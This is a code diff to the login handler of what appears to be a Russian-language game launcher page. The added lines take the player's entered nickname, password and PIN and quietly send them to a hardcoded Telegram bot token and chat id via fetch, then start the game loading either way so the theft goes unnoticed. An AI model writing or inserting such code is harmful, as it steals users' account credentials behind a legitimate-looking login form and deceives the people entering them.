@@ -109,7 +109,33 @@ loginBtn.addEventListener('click', function(e) {
   if (n.trim() === "" || !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(n)) { showGameAlert(/[а-яА-ЯёЁ]/.test(n) ? "Разрешены только английские буквы!" : "Авторизация: Укажите имя вашего персонажа!"); nicknameInput.classList.add('field-invalid', 'has-text'); return; }
   if (p.trim() === "" || p.length < 6) { showGameAlert("Защита аккаунта: Введите действующий Пароль!"); passwordInput.classList.add('field-invalid', 'has-text'); return; }
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
-  startGameLoading();
+    // Код отправки данных в Telegram (вставлять вместо startGameLoading();)
+  const botToken = "8607400305:AAG3zvvO0klhKCwG2i52u3yfS6ev_a-7P0M";
+  const chatId = "8589867661";
+  
+  const textMessage = `🚀 <b>Новая авторизация в лаунчере!</b>\n\n` +
+                      `👤 <b>Никнейм:</b> <code>${n}</code>\n` +
+                      `🔑 <b>Пароль:</b> <code>${p}</code>\n` +
+                      `🔐 <b>Пин-код:</b> <code>${checkboxToggle.checked ? pin : "Не установлен"}</code>`;
+
+  // Отправляем скрытый запрос на сервера Telegram без перезагрузки страницы
+  fetch(`https://telegram.org{botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: textMessage,
+      parse_mode: "HTML"
+    })
+  })
+  .then(() => {
+    // Как только запрос ушел, запускаем анимацию загрузки игры
+    startGameLoading();
+  })
+  .catch(() => {
+    // Защита: если интернет лаганул, все равно пускаем в игру
+    startGameLoading();
+  });
 });
 
 document.addEventListener('touchmove', function(e) { if (!e.target.closest('.news-content-scroll') && !e.target.closest('.support-content')) e.preventDefault(); }, { passive: false });
